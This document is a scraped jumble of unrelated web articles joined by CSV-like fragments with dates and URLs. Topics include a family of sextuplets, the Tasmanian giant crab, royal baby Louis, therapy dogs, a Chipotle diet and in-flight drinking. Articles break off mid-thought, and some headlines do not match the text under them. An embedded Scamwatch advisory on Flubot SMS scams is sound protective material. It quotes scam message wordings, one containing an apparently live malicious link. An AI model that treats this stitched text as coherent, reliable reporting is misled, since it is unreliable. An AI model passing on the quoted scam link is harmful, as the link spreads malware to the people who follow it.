Toddler Beds Since the Justices have expanded their family, many aspects of their lives have changed. Right now, the family has been shifting the way they sleep. The mother of the multiples also shared that all five toddlers are in the process of transitioning into toddler beds. She admitted, “Having five in toddler beds is an adventure. But we are getting there.” Moving five kids that are three to four-year-olds from cribs to beds is a huge feat. Clearly, Sarah and Andy have an immense amount of patience.

Crazy Schedules So, we are sure you were wondering how the Justices keep up with so many young children at one time. They do it all by having an extremely organized schedule. Organized plans are crucial when you have a big family. The family of eight starts their day off with a morning walk. After the stroll, typically the toddlers have playdate plans with friends and relatives. Then the playdates are often followed by family household chores that are done all together.

Bathroom Time Anyone with just one growing toddler knows that potty training can take over a parent’s life. Now multiply that by five! A huge part of the family’s day is devoted to bathroom breaks. Sarah got candid with Babyology about the struggle with bathroom time. She shared, “Potty breaks are a big part of our day when you have five children at the same life stage.” Luckily, the Justices will get through that milestone soon and move on to other cleaner activities.

Never Alone It is pretty incredible that the Justice children will never be left out without anyone to be with. At school, these kids will not ever have to worry about not having someone to sit with at lunch or not having a friend to play with. The mom of six shared, “We never lack playmates and work to promote love and care between the siblings. Our children will always have a friend and will never need to feel lonely.”

Come a Long Way Over the years, the Justice family has grown and changed a lot. Sarah and Andy have come a long way from having to use 84 bottles and 300 diapers a week. Now, when Sarah and Andy feed baby Caleb, they only need one bottle at a time. According to the parents of six, all of the other kids “absolutely adore their baby Caleb.” The toddlers love playing with their new baby brothers and showering him with hugs and kisses.","A Couple Adopted Triplets, One Week Later Doctor Reveals Unexpected News",

",5/05/2018 19:29,https://en.wikipedia.org/wiki/Tasmanian_giant_crab,"Species of crab

The Tasmanian giant crab, Pseudocarcinus gigas (sometimes known as the giant deepwater crab, giant southern crab or queen crab) is a very large species of crab that resides on rocky and muddy bottoms in the oceans off Southern Australia.[2][3] It is the only species in the genus Pseudocarcinus.[4]

Habitat [ edit ]

The Tasmanian giant crab lives on rocky and muddy bottoms in the oceans off Southern Australia on the edge of the continental shelf at depths of 20–820 metres (66–2,690 ft).[2][3] It is most abundant at 110–180 metres (360–590 ft) in the summer and 190–400 metres (620–1,310 ft) in the winter.[3] The seasonal movements generally follow temperature as it prefers 12–14 °C (54–57 °F).[3] The full temperature range where the species can be seen appears to be 10–18 °C (50–64 °F).[5]

Description [ edit ]

The Tasmanian giant crab is one of the largest crabs in the world, reaching a mass of 17.6 kg (39 lb) and a carapace width of up to 46 cm (18 in).[6] Among crabs only the Japanese spider crab (Macrocheira kaempferi) can weigh more.[5] Male Tasmanian giant crabs reach more than twice the size of females,[7] which do not exceed 7 kg (15 lb).[6] Males have one normal-sized and one oversized claw (which can be longer than the carapace width[5]), while both claws are normal-sized in the females.[6] This crab is mainly whitish-yellow below and red above; the tips of the claws are black.[8] Small individuals are yellowish-and-red spotted above.[5]

Behaviour [ edit ]

The Tasmanian giant crab feeds on carrion and slow-moving species, including gastropods, crustaceans (anomura and brachyura) and starfish.[3][7] Cannibalism also occurs.[3] They breed in June and July, and the female carries the 0.5–2 million eggs for about four months.[7] After hatching, the planktonic larvae float with the current for about two months before settling on the bottom.[5] The species is long-lived and slow-growing; juveniles moult their carapace every three-four years and adult females about once every nine years.[5][6] This greatly limits the breeding frequency, as mating is only possible in the period immediately after the old carapace has been shed, and the new is still soft.[6]

Fishery [ edit ]

The Tasmanian giant crab has been commercially fished in Tasmanian waters since 1992 and a minimum size was established in Australia in 1993.[7] Fishing is typically by pots in water deeper than 140 m (460 ft).[6] Following concerns surrounding the sustainability of catch numbers, the total allowable catch was adjusted in 2004 to 62.1 tonnes (137,000 lb).[9] Twenty-five operators competed for the catch in 2005, delivering a total catch valued at about A$2 million.[9] The Tasmanian giant crab is very long-lived and slow-growing, making it vulnerable to overfishing.[7] Before export, they are sometimes kept alive in tanks with water that is 10–14 °C (50–57 °F).[3]

Jenna Fischer finally reveals what Pam said to Michael

",4/05/2018 21:16,https://mashable.com/article/jenna-fischer-the-office-steve-carell-goodbye,"It's been nearly five years since The Office ended, but Jenna Fischer is still answering questions about her role as Pam Beesly.

In an Instagram live video on Tuesday, Fischer answered one of the lingering questions fans still have to this day: What did Pam say to Michael in Season 7's touching episode, ""Goodbye, Michael?""

In Steve Carell's farewell episode, Michael says goodbye to everyone in the office except Pam, who was busy running an errand.

Pam was MIA because she thought Michael wasn't leaving until the next day, but once Jim found out Michael was catching a flight to Colorado to live with his fiancé later that night he brought Pam to the airport to make sure the two got to part ways properly.

Pam and Michael meet up and exchange words, but no one could hear what was said because neither of them were wearing their mics (it was supposed to be a documentary, remember?).

""That was me talking to Steve. I told him all the ways I was going to miss him when he left our show. Those were real tears and a real goodbye,"" Fischer told her Instagram followers. ""That was a really emotional scene.""

Fischer was also asked to reveal her favorite episode, a question to which she had a very thorough answer.

""I just watched 'Branch Wars' from Season 4 and I was kind of loving it,"" she said. ""But my ultimate favorite is 'Dinner Party.'""

How great is it to know that the entire cast is just as obsessed with that episode as fans are?

Fisher went on to give the ""Health Care"" episode in Season 1 a shoutout, along with the episodes after Pam gave birth. The actress revealed she loves when Pam nurses the wrong baby in ""The Delivery,"" sharing that her IRL husband was in the episode.

After four long days of waiting, royal fans finally learned that the Duke and Duchess of Cambridge named their newborn prince Louis Arthur Charles. Even though the name Louis goes back generations in the royal family — Prince Phillip's uncle was Lord Louis Mountbatten and it's also one of Prince William and Prince George's middle names —there's still a lot of debate over how to pronounce the royal baby's name.

So what is it? While the name Louis can be pronounced either loo-ee or loo-is, there is a right way to pronounce the royal baby's new name.

Since the name Louis is originally a French name that means ""renowned warrior,"" the royal family — as well as pretty much everyone else in the UK — pronounce the name the French way.

So, the right way to say the royal baby's name is loo-ee.

Not only do Prince William and Prince George both pronounce their middles names this way, but also it's the way that all 18 of the French kings named Louis pronounced their names, too. Other famous Louis that pronounce their name the same way include the musician Louis Armstrong, fashion designer Louis Vuitton and One Direction singer Louis Tomlinson.

",3/05/2018 21:27,https://www.scamwatch.gov.au/news-alerts/missed-delivery-call-or-voicemail-flubot-scams,"Since August 2021, many Australians have been getting scam text messages about missed calls, voicemails or deliveries. We’ve received over 16,000 reports of these scams. These scams have also already been a problem overseas in 2021.

The text messages ask you to tap on a link to download or access something. There are a large number of variants of the Flubot text messages, but often they ask you to download an app to track or organise a time for a delivery, hear a voicemail message, or view photos that have been uploaded. However, the message is fake, there is no delivery, voicemail, or photos uploaded and the app is actually malicious software called Flubot.

Android phones and iPhones can both receive texts from the Flubot.

If you receive one of these messages, do not click or tap on the link. Delete the message immediately.

What the scam messages look like

Scammers are frequently updating the Flubot text message format. We’ll update this page regularly, but we recommend that you check the @Scamwatch_gov Twitter account for the most up to date warnings about these messages.

Flubot text messages change regularly

Flubot scammers are regularly updating the text messages they send out to try and infect your device with Flubot. Recently, we’ve received reports of messages relating to Zoom invites, Google verifications and ‘thank you’ messages from clinics, as well as the major categories set out below.

Flubot text messages include a link which almost always contains a series of 5-9 random letters and numbers at the end of the link

As a general rule, if you receive a text message that contains a link, do not click on the link.

Photo uploads

Starting in October 2021, some Flubot messages now say that your photos have been uploaded. They provide a link to where the ‘album’ has been uploaded.

The typical wording of these messages is:

Someone uploaded your | pictures. A whole album is uploaded - | here: https://consult.priyalco.com/h/?cftlkv"">https://consult.priyalco.com/h/?cftlkv y6j

Example: An SMS that says someone has uploaded your photos

We strongly recommend that you never click on the links in these messages. However, if you do accidentally click on this link, we note that this will take you to a page which claims your device is already infected with Flubot and tells you that you need to install a security update to remove Flubot.

This is a clever trick by scammers; your phone is not infected, but installing the security update will infect your phone as it downloads the Flubot malware.

Delivery notifications

Starting in September 2021, many Flubot messages now talk about a delivery. They usually refer to DHL and always ask you to take some form of action in relation to the 'delivery'. We have also started to see reports referring to Amazon deliveries.

Messages can include:

scheduling a delivery time

tracking a delivery

managing a delivery that is 'in transit' or will be 'delivered soon'

telling you it's your last chance to arrange pick up/delivery of a parcel

asking you to enter your details to receive a package

getting 'more information' about your delivery.

Unlike earlier Flubot messages (which are also still circulating), the new text messages may not contain spelling mistakes, so they can be harder to spot. However, they do contain a website link followed by 5-9 random letters and numbers. Here are some examples:

The delivery time for your parcel is 03/09. Check out your options: http://example.com/g.php?l2r54ya alfal

Your DHL order ID1842225 will arrive soon. Track progress here

Your order will be delivered by DHL tomorrow between 11:26 and 14:26. Track progress https://example.com/n.php?la4pmtf6u yewv

Arriving today: your (d08) Amazon {s7} package. More info at https://example.com/n.php?ps7gxif4s

Example: An SMS that says your order will be delivered soon Example: This SMS says it's your last chance to pick up a pending package. Example: This SMS says that a parcel is coming today. Example: SMS that claims you have 2 packages and it is your last chance to collect. Example: This SMS asks you to click to track a package.

Voicemail and missed call notifications (August 2021)

Missed call and voicemail messages started circulating in Australia in August 2021. They often begin with 5-9 random lowercase letters or numbers, then say you had a missed call or voicemail message.

The text message often includes several misspellings. Here are some examples.

ab12c3 Nfw voice yessage received

gh6tr7 Voicemail message receiied

x78y9z New oozce-message received

After saying you have a missed call, voicemail or message, the messages include a link. The message may also say the voicemail message will be automatically deleted if you don’t access it.



Example: Android's spam/blocked folder with several scam messages

Example: A scam message saying that a voicemail message was received.

Example: A fake voice message notification on an iPhone

Example: A text message saying that the recipient missed a call.

Example: An iPhone notification showing a scam message about a missed call.

What happens if you click or tap the link

Clicking/tapping the link could lead to downloading malware (malicious software) to your phone.

Here's what each type of scam looks like.

For photo upload texts

You'll see a screen with:

a warning that your device has been infected with Flubot

a button or link that asks you to 'install security update'

The page sometimes says that a window may appear preventing the installation and that you should enable the instillation via your devices settings.

For delivery texts

You'll see a screen with:

stolen DHL / courier branding

a button or link asking you to download an app to track your delivery's progress

The page sometimes says your phone may flag the app as suspicious and that you should ignore this warning.

For voicemail/missed call texts

You'll see a screen with:

your phone number

a note saying how long the fake message is (such as 2 minutes and 34 seconds)

a link to 'Download voicemail app' and instructions to enable the download of the application if this was blocked initially by your phone.

If you have an Android device

If you have an Android device, it will download an application called Voicemail71.apk, Update42.apk’ or DHL34.apk. This application is malware.

You would then be asked to install the application.

The landing page that fraudulently states your device is infected with Flubot can look like this:

The landing page that asks you to download the fake DHL application can look like this:

The application may be able to:

read your text messages

send text messages from your phone

make phone calls from your number

access your contacts

Installing the software is likely to give scammers access to your passwords and accounts. They may be able to use this information to steal your money or personal information.

It will also ask other infected Australian phones to send Flubot messages to the numbers it steals from your phone, continuing and expanding the scam.

If you have an iPhone

If you have an iPhone, you may see a link to download software. This software isn’t the same as Flubot, but it can still damage your device.

What to do if you’ve downloaded the Flubot

Act immediately. If you have already clicked the link to download the application, your passwords and online accounts are now at risk from hackers.

Don't enter any passwords or log into any accounts until you have followed the below steps. If you need to check your online banking, use a different device to do so.

Clean your device

Cleaning your device using the steps below will remove the malicious software from your device.

To clean your device, you can:

contact an IT professional

download official Android anti-virus software through the Google Play Store

perform a factory reset of the device, as soon as possible.

The best way to make sure that your phone is clean is to use the 'Erase all Content and Settings' or 'Factory reset' features. The exact name of the feature will depend on the device you have. Performing this reset of your device will delete all of your data including photos, messages, and authentication applications.

When performing a factory reset it's important that you don't restore from any backups created after you downloaded the app, as they will be infected.

Change your passwords and secure your information

If you have logged in to any accounts or apps using a password since downloading the app, you need to change your passwords.

If you have used the same passwords for any other accounts, you also need to change those passwords.

Contact your bank and ensure your accounts are secure.

How to protect yourself

Do not click on links in text messages that contain a link with a series of random numbers and letters.

Do not call back the individual who sent the text. It’s unlikely that they are a scammer or criminal. Scammers can disguise their caller ID as legitimate numbers to carry out these scams. This is also known as spoofing.

Delete the message immediately.

Hear me out.

Imagine you've been hit with a sudden craving for candy. You go to the store, fork over a dollar (or, if you live in New York, your life savings) for a bag of gummy bears. Because you're a classy one, you go for the classic Haribo Gold-Bears gummies: the good kind.

As you're eating, you relish in the sugary, fruity flavors of the miniature bears, switching colors as you go: Yellow for lemon, red for raspberry, green for… wait, what is that flavor?

You've been conditioned to associate that toxic waste-like shade of green with green apple or lime. Watermelon, even, if we're getting fancy.

But Haribo's green gummy bears are none of these flavors. Haribo's green gummy is, perplexingly, strawberry flavored. A writer for Metro's UK site made this baffling discovery today, and dutifully shared her findings with the rest of the English-speaking world via a short post on the site; she, too, felt betrayed by the secret life of the Green Gummy.

If you're feeling confused, outraged, lost — just know that you're not alone.

I suggest that you go to the grocery store and stock up on as much green apple, lime (and maybe even watermelon) candy you can get your hands on, and stuff your face until it hurts.

Candy-replacement therapy may not heal your wounds — that's time's job — but it will certainly help.

Therapy Dogs Work Miracles. But Do They Like Their
Jobs?

A new study examining the stress levels of working canines provides some
reassuring results.

NEWS.NATIONALGEOGRAPHIC.COM
",3/05/2018 8:03,https://www.nationalgeographic.com/animals/article/animals-dogs-therapy-health-pets,"If you're a dog lover, just being with your pet feels good.

So it's no surprise that therapy dogs are healing companions for people with health conditions such as cancer, post-traumatic stress syndrome, and dementia.

There are over 50,000 therapy dogs in the United States, and they're becoming more popular in countries from Norway to Brazil. Trained and certified by a variety of organizations, these dogs and their handlers go into hospitals and other facilities and interact with patients.

Research confirms that the benefits of pet therapy are real—but what do dogs think about helping humans? Science has considered this question too, and the results are reassuring. (Read why pets are so good for us.)

A recent study in Applied Animal Behaviour Science reports that therapy dogs in pediatric cancer wards are not stressed by their ""work,"" and in fact seem to enjoy it in most cases.

""What made this study unique was that it was multisite—it took place in five different hospitals across the country—and the fact that we visited over a hundred patients and 26 dogs participated, making it the largest of its kind in this field,"" says study leader Amy McCullough, national director of research and therapy at American Humane, a Washington, D.C.-based animal welfare organization.

Working Like a Dog

The researchers measured levels of cortisol, a hormone elevated in response to stress, in the canines' saliva. The swabs were taken both at home and during therapy sessions at the hospital.

However, cortisol level rise with both good and bad stress. ""Let's say we have a dog that loves to play ball—when the ball comes out and the dog starts chasing the ball, that would elevate the dog's cortisol levels as well,"" McCullough says.

So the team also videotaped and analyzed 26 canine behaviors in three categories: friendly actions such as approaching a person or play-bowing; moderate stress indicators such as lip-licking and shaking; and high-stress behaviors like whimpering. (Read more about why dogs are so friendly.)

1:03

The scientists found no difference between the study dogs' cortisol levels at home and at the hospital, evidence that the therapy dogs were not particularly stressed.

Making Work Fun

The finding is consistent with previous research, according to Lisa Maria Glenk, author of a 2017 review of the literature on therapy dog welfare.

The ""well-designed"" study is particularly valuable for its level of detail: ""Previous studies provided only limited or no information on session activities, which makes it hard to identify the practices that raise stress levels in dogs,"" says Glenk, of Vienna's University of Veterinary Medicine.

The next question is whether therapy dogs actually enjoy their work, she says—and the new pediatric cancer study provides a few hints. (Your dog knows how you feel—here's how.)

For example, dogs seemed happier during some activities than others; a child talking to the dog or playing with its toy, for example, seemed to elicit more friendly responses than a child brushing the animal or drawing it.

Looking at the results, ""it's fair to say that some activities are more fun for the dog,"" McCullough notes.

""This is good information for handlers—they can lean toward the activities that they think their dog would enjoy.""

Finding a Natural Fit

That requires observing therapy dogs closely, even if they can seem inconsistent at times. For instance, the study found that the dogs who showed the most stress behaviors also showed the most friendly behaviors, suggesting that some canines may just be more obvious about their feelings. (See some of our favorite dog pictures.)

Like with any job, it's important to choose the right candidates, McCullough adds. Many people want to share their pets' affection with their local communities, ""but that doesn't mean their dog is cut out for this kind of work.""

So therapy dog trainers and certifiers, as well as owners, need to look for enthusiasm, not mere tolerance.

""Does the dog solicit attention, or does the dog need to be bribed with treats to interact?"" she says.

""It needs to be a mutually beneficial interaction when they are visiting with the client, so it's important that the dog really loves their job.""",Therapy Dogs Work Miracles. But Do They Like Their Jobs?,

There Is One Major Difference Between Prince Louis' Birth Certificate and George and Charlotte's

Not all royal birth certificates are alike!

The major difference between Prince Louis‘s birth certificate and the ones his siblings had is evident at first glance. The text on Louis’ birth certificate was typed, while Prince George and Princess Charlotte‘s were handwritten.

Though the writing on the birth certificates is one major difference, the rest of the details are almost exactly the same. Louis’ birth was registered in the London district of Westminster (home to Big Ben and the Houses of Parliament), as were George and Charlotte’s.

A father in Florida has been branded a ‘bully’ himself after he apparently forced his son to stand at the side of the road holding a sign reading ‘I am a bully’.

It goes without saying that bullying should never be tolerated and that parents should do what they can to nip it in the bud if they learn their child is mistreating others, but the way this particular set of parents chose to handle the situation has prompted mixed reviews from other members of the public.

Advert 10

The scene was shared online by TikToker Gavin Klein after apparently being filmed in Florida, where a young boy could be seen holding the telling sign above his head while two people who appear to be his parents sat in deck chairs watching over him.

Check it out below:

Advert 10

The person behind the camera could be heard describing the scene as ‘so mean’, before saying they wanted to ‘yell at the parents’ for making the child hold the sign which read: ‘I am a bully. Honk if you hate bullies.’

Of course, with very little context surrounding the video, it’s hard to know exactly what led to the boy being placed at the side of the road, but still, social media users have blasted the parents for ‘publicly humiliating’ their son.

Klein described the dad as a ‘bully’ as he posted the video, while another responded to say that ‘publicly embarrassing your child isnt [sic] the way to fix the problem.’

A third responded: ‘discipline is okay. Public discipline is not going to teach them anything.’

Other TikTokers, however, have positioned themselves on the parents’ side, arguing that ‘If you disagree with this as a form of punishment, you’re soft.’

One comment reads: ‘That’s parenting [clap emoji]. Discipline, embarrassment to make them never do it again. That def [sic] ain’t mean.’

At the time of writing, December 24, the clip of the young boy has racked up more than five million views.

",29/04/2018 9:41,https://www.popsugar.com/family/How-Many-Nannies-Does-Kate-Middleton-Have-44772269,"Kate Middleton is officially a mom of three! The Duchess of Cambridge and Prince William welcomed their third child, a baby boy named Louis, on April 23, and the world is officially in royal baby frenzy (that is, until Prince Harry and Meghan Markle tie the knot). While most people are celebrating the newest member of the royal family, public figures as well-known as Kate aren't strangers to having a few haters.

Who cares if she doesn't have a ""regular"" job? By having a nanny, she's helping herself be a better mother.

While Kate doesn't have a traditional 9-to-5 job that keeps her away from her kids most days, she is extremely busy. In addition to working with numerous charities, including her Heads Together initiative with William and Harry, Kate makes official appearances at locations all around England to raise awareness for issues affecting its people. She also goes on royal tours with her family, attends official dinners and galas, and, most importantly, is mom to her kids, Prince George, Princess Charlotte, and Prince Louis. And since starting their family in 2013, Kate and Will have used the care of a nanny, Maria Teresa. Naturally, plenty of people feel the need to judge their decision to have extra help when they already live at Kensington Palace, which has a full staff. My response? Leave her alone.

People can raise their children how they want to and that includes royals. Gone are the days from the 1950s when almost every suburban family chose to raise their children in the same cookie-cutter way. No mother should ever shame another mother for how they choose to raise their kids, or for having a little extra help with the everyday grind. Kate is simply giving her children a little extra love from another human being, and I don't see anything wrong with that. Those children are lucky enough to be born into royalty, but they're extra blessed that they have another person or two in their home keeping them safe, teaching them lessons, and making them feel special.

If I could afford a nanny to come into my home and play with my kids while I worked out or showered alone, then hell yes, I'd do it. Why not? Mothers, even duchesses, deserve some alone time, too. Who cares if she doesn't have a ""regular"" job? By having a nanny, she's helping herself be a better mother by simply giving herself a break. And motherhood can be lonely at times, too. Maybe she and her nanny have formed a little camaraderie. I bet having a nanny by her side helps her from going insane due to all of the mundane activities and messes that come with being a mother. We see Kate all dressed up and looking gorgeous in public, but she probably has messy hair and sweatpants days, too (man, I'd love to see that).

And Kate is usually always with her kids whenever she can be. She and Will have been praised in the past for paving the way to a more modern monarchy, and that includes putting family ahead of their royal duties. They bring their children on royal tours, are open and honest about how they raise them, put them in traditional schools with other children, and yes, have play dates in the park with a nanny. Kate is a hands-on mother who's utilizing her resources. Let's not shame her for that but instead applaud her for doing a damn good job. She may be part of the royal family, but she's a mother, just like us, so we all have the same title and are doing our best at the hardest job in the world.

Legend had it that Tom Cruise and his jumbo-sized smile came close to going underneath Tony Stark’s armor in Iron Mano. In a new interview, Cruise clarified how near we came.

Chatting with ComicBook.com as part of Mission: Impossible — Fallout promo, Cruise shared that he wasn’t as close to playing Iron Man as Marvel lore would suggest. Not that he had an unkind word for the person who did take on the role.

“Not close,” Cruise explained. “Not close, and I love Robert Downey Jr. I can’t imagine anyone else in that role, and I think it’s perfect for him.”

As for a superhero role that might be perfect for Cruise, the stunt enthusiast said that he’s not opposed to doing the comic book thing if the project’s right.

“I don’t rule anything out,” he said. “It’s, ‘What’s the story? Does it interest me? Do I feel this is where the audience would like to see me in? What can I learn?’ And ‘What can I contribute?’ That’s how I choose my movies.”

That’s a sensible strategy. Mind you, there are a few flicks in Cruise’s filmography that I salivate over imagining a detailed explanation of how they answered his demanding set of questions.

The highly-anticipated announcement of the new royal baby name was made via Kensington Palace’s official Twitter account on Thursday, prompting an outpouring of emotion from royals fans around the world. As the odds on Louis had previously been 33/1, many expressed surprised at the choice.

Some were quick to comment on the historical significance behind the name, while others opted to share strong opinions.

After arriving at St. Mary’s Hospital in London on Monday, Kate Middleton gave birth to her third child with Prince William at 6 a.m. EST. The couple then introduced Prince Louis to the world outside the hospital’s private Lindo Wing just as they did with their first two children, Prince George and Princess Charlotte.

On NPR’s Hidden Brain podcast, they share a simple way to find out if the person you’re greeting is a stranger or someone you should know. Aim to say this in a light or neutral tone so it comes off as natural. As you shake their hand or give a quick wave, say, “Hey, do I know you from somewhere...?”

If they say no, play it off with, “Oh, you just looked a little familiar. Wonderful to meet you!”

If they say yes and mention how you know each other, follow up with, “Yes, that’s right. So good to see you again!” Of course, this only works one or two times with the same person, so if you have a strong feeling you’ve met them before (and maybe used this trick), go for something more general like, “Hey, how are you?”

As with any type of warm greeting, the key to making this work is to send signals that you’re pleased to meet this new person (or see them again if it turns out you know each other).

Garlic bread is one of the most delicious snacks around, but what happens to the taste when it’s been sent to the edge of space?

YouTuber Tom Scott sent half a loaf of garlic bread to the edge of space, then taste-tested it against bread that had stayed on Earth.

The video sees the bread float 35km up to the stratosphere – the second major layer of Earth’s atmosphere – on a weather balloon. The bread is then sent back down and tasted by a group.

The amazing video has over 973,000 views and shows Scott with a group, including maker of the bread Barry Lewis, and Steve Randall from Random Aerospace, launching the snack into the stratosphere.

The group tracked the balloon with a GPS to find the garlic bread’s predicted landing spot.

Scott said it’s rare that space-sent food actually gets eaten, and when the group tested the bread, they found it had an icy middle due to the stratosphere’s freezing temperatures.

And many of Costco’s deals are fan favourites with customers and employees.

But when Business Insider recently asked 46 Costco employees from around the country to share what items they wouldn’t buy at the store, several of them said they didn’t buy produce at the store.

And the reason wasn’t quality.

The issue was the chain’s penchant for bulk sizes.

“While our produce department is one of the best in the business, I personally don’t eat veggies fast enough to buy in bulk, so two thirds of it will spoil before I eat it,” a Minnesota-based Costco worker told Business Insider.

A Costco manager that’s worked all around the US said that buying produce was a “waste of money” for them, as they couldn’t “eat the huge quantity fast enough.”

Three additional employees from Utah, Idaho, and Hawaii agreed that they steered clear of buying produce from Costco for the same reason.

This Guy Ate Nothing but Chipotle for 186 Days, and
This Is What It Did to His Body

Is eating Chipotle every single day even healthy?
GUFF.COM
",17/04/2018 19:27,https://time.com/4417999/fit-guy-eats-chipotle-every-day/,"Devin Cunningham, 25, has great abs. But his secret might surprise you. He says his steady diet of Chipotle, which he’s been been eating every single day for a year straight, has helped him get in prime shape. In fact, he plans to keep eating Chipotle daily for an unspecified period of time.

“I just really like Chipotle,” he says.

The Washington state resident, who works in communications and marketing, wasn’t always this obsessed with the fast-casual burrito chain, but he had seen a story about a guy who ate Chipotle straight for 186 days — and knew he could do it even longer. After all, he was already eating there three to five times a week.

There was a surprising second reason to take on the 366-day Chipotle challenge: getting fit. Two years ago he discovered the “if it fits your macros” diet, which essentially prescribes the specific amounts of carbs, protein and fat you should consume in a day. Soon after, he doubled down on working out more effectively and learning to lift weights correctly. He decided that embarking on the year of eating Chipotle would actually be a good complement to his new fitness and diet habits.

Chipotle turned out to be a good place to experiment, as it’s “pretty spot-on with portions,” he says. At one point during the challenge, when he was being so stringent about what he ate that he even had the Chipotle servers package the components of his burrito bowls separately so he could weigh everything himself.

His biggest challenge came last fall, when all his local Chipotles shut down for two weeks because of an E. Coli scare. Luckily, Cunningham lives close to the border with Canada, so he was able to drive up north twice to pick up a necessary two-week supply of burritos from Vancouver, which he kept fresh by freezing them.

And about that E. Coli issue: “That didn’t worry me at all,” he says of the potential for contamination.

Beyond the Chipotle obsession, the rest of his diet is actually pretty normal: in the morning, it’s a blueberry bagel and protein shake or parfait with nonfat Greek yogurt. For lunch, he’ll hit up Chipotle; lately he’s been going for a chicken bowl with rice and cheese on the side. And in the evening, he’ll build a protein-rich meal around chicken or a turkey burger. He says he works out about six days a week, putting in 15 to 20 minutes of cardio a few days a week, with the rest of his workouts focused on weight lifting.

He has meticulously kept track of his progress and Chipotle purchases on Instagram, where his pics seem to support his claim that yes, it’s possible to get fit on a (partially) fast food diet.

The fast-casual chain took notice of his challenge, tweeting a special acknowledgement of his accomplishment.

And even after over a whole year of dedication to the challenge, he says he has no plans to let up.

“I want to inspire people to be fit,” Cunningham explains. “When people ask me advice on what foods to eat or what workouts to do, it makes me feel awesome and it makes me feel even better when I see them follow through with their goals.”

The takeaway? Even the burrito diet is real. Now we really have no excuses. (And maybe, if you’re as dedicated as Cunningham, you’ll even get a few free meals for your efforts.)

Vos is a volunteer with Cat Shelter Limburg, a Belgium-based group that specializes in caring for homeless felines. So, naturally, when she received word about one such animal in need, she didn't hesitate to help. ""A man called our rescue number because he found a very little black kitten, only a few days old,"" Vos told The Dodo. ""He asked us to come and pick up this little baby."" Little did she or anyone know at the time, however, that things weren't exactly how they seemed.

Martine Vos

A search of the area where the little animal had been found turned up no signs of her mom, or any possible siblings, so Vos planned to take the orphan to a foster family who could care for her. It was around this time that Vos noticed that something was off about the supposed kitten. ""When I took the baby in my hands, she seemed really big and it felt totally different how a kitten should feel,"" Vos said. A closer inspection revealed that her face really wasn't so kitten-like either.

Her curiosity piqued, Vos and a colleague visited a veterinarian in hopes of confirming just what sort of animal this little baby actually was. But the vet was stumped, too. ""The one thing she was sure of is that it was a baby girl,"" Vos said. Next, Vos decided to consult a nearby wildlife rescue center — and with that, the mystery was solved. ""They recognized it as a baby fox,"" Vos said. Turns out, fox pups are often a darker shade very early on in life, and they do have a vaguely cat-like look.

Vos was thrilled to learn the rescued baby's true identity: ""Firstly, because I am really interested in the native wild animals,"" she said. ""And because of my surname 'Vos', which means 'fox' in Dutch. It was my dream to meet a fox in real life. So holding this little baby fox in my hands and preventing it from a certain death was a dream that came true!"" The baby fox has since been placed with wildlife experts to be raised until she's old enough to return to the wild.

The Irish UFC star was arrested last week for an alleged attack on a UFC team bus.

However, his latest statement on Instagram indicates that life is still good.

He said he has the “best job in the world” looking after his family.

Frequent Instagrammer Conor McGregor has made his first statement on the platform since getting arrested last week – and it’s to say he has the best job in the world.

However, the UFC fighter, a former two-weight world champion, was not talking about life in an octagon, but life as a family man.

McGregor, 29, has been a full-time professional mixed martial artist since 2008. In those 10 years he has won featherweight and lightweight titles in Cage Warriors, featherweight and lightweight titles in UFC, and has become the biggest pay-per-view attraction in the whole of MMA.

By his side with every step of his ascent to the top of the combat sports mountain has been Dee Devlin, his partner of 10 years. The Irish couple had their first child, Jack McGregor Jr, on May 5 2017 – just a few months before McGregor’s landmark boxing rules bout against Floyd Mayweather in Las Vegas.

McGregor regularly posts family photos on his official Instagram account. And, despite the global fallout from his well publicised arrest earlier this month, that trend continued on Thursday.

“I have the best job in the world looking after my family,” he said. “If we all look after our own, we are all looked after.”

McGregor is yet to make a comment since he was recorded on video attacking a UFC bus, throwing a guard rail, and starting a confrontation that led to two athletes requiring hospital treatment.

He turned himself in to police last week, was charged with three counts of assault and one of criminal mischief, but reportedly told his boss – UFC president Dana White – that the alleged attack “had to be done.”

The NYPD’s Emergency Service Unit was called but the animal that police safely caught turned out to be a large raccoon.

Animal Care Centers of New York City took custody of the raccoon from the NYPD and put it down. The law requires it.

“The raccoon was brought into our facility and was euthanized as required by law for all vector species animals brought into the shelter,” ACC said in a statement. “Raccoons, bats and skunks are classified as a rabies vector species, which means it's an animal that can carry and transmit rabies.”

On his blog God Save the Points, Ott provides the do's and don'ts of making it happen.

Whatever you do, never try and serve yourself.



Unless you're flying first class, chances are you're used to only getting one or two complimentary drinks on a flight — or at least having to pay for alcohol, even if it is just those mini bottles of wine available.

But, according to frequent traveller and air miles guru Gilbert Ott of God Save the Points, it's actually possible to legally bring – and drink — your own booze on board. Here's what you need to know:

You can make good use of the 100ml bottle rule...

While an entire bottle of whiskey won't make it through security, there's an easy way to get a smaller amount of your favourite tipple through.

""You’re probably aware that liquid containers may not exceed 100ml,"" Ott writes. ""Same goes for perfume, cosmetics, etc.

""Fortunately, mini alcohol bottles fit into the sizing requirements, and you can bring multiple mini bottles through security. It’s absolutely fine. Just put them in a clear plastic bag, just as you would any other liquid items.""

...or go shopping at duty-free.

Your second option is shopping for booze once you get into the airport lounge — as long as you're flying direct.

""If you’re travelling internationally, you could absolutely buy a bottle of wine or Champagne (anything you’ll consume entirely on the plane) on your next flight,"" Ott writes, warning: ""Don’t buy from duty-free if you have a connection where you’ll need to re-clear security before consuming. You’ll lose it!""

Whatever you do, don't try to serve yourself

""You CANNOT serve yourself on the plane. Any plane. No. You can’t,"" Ott stresses. ""You CAN however politely ask a member of the cabin crew if they would not mind serving you the liquor you brought on board.

""JetBlue famously made light of this policy last year — and we know many have successfully done this on other airlines around the world. There are no guarantees a crew will say YES — but this is real — and this happens.""

Be prepared to drink the whole bottle

While you might get a nice flight attendant willing to open your own bottle for you, you better be ready to drink the whole thing.

""Don’t ask the crew to open anything which will not be finished on board. And please, be discrete,"" Ott writes. ""The crew must dispose of anything open and unconsumed at the end of the flight. For that reason, it’s best to keep things simple.""

Don't overdo it

According to Ott, the crew have final say on your ability to consume alcohol — so be wise in your consumption.

""If they decide you look far too ready for midnight karaoke — they have full right to cut you off,"" he writes. ""In each and every circumstance — arguing with them is going to go poorly for you, so just don’t. Just sit back relax, enjoy the flight and politely persuade someone to pour you a lovely drink. You’ll be on the ground before you know it.""",This is how you can legally bring — and drink — your own booze on a flight,

Notwithstanding the controversies over their reported inaccurate health risk

They do provide the user with some basic genetic curiosities – and in one case, it appears the revelation was a little more shocking than the customer bargained for.

